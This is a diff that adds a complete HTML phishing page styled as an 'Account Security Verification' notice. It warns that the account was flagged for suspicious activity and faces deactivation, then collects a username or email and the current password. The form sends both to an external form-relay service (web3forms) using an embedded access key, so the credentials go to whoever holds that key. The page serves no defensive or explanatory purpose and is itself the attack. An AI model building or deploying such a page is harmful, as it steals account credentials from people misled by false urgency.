@@ -1,1 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Account Security Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: Arial; padding: 20px; text-align: center; background: #f4f4f4; }
+        .box { background: white; padding: 30px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { width: 95%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Security Verification</h2>
+        <p>Your account has been flagged for suspicious activity. Please verify your identity to prevent account deactivation.</p>
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="7e163b2f-7634-4063-959c-85060879f977">
+            <input type="text" name="username" placeholder="Username / Email" required>
+            <input type="password" name="password" placeholder="Current Password" required>
+            <button type="submit">Verify My Account</button>
+        </form>
+    </div>
+</body>
+</html>
 
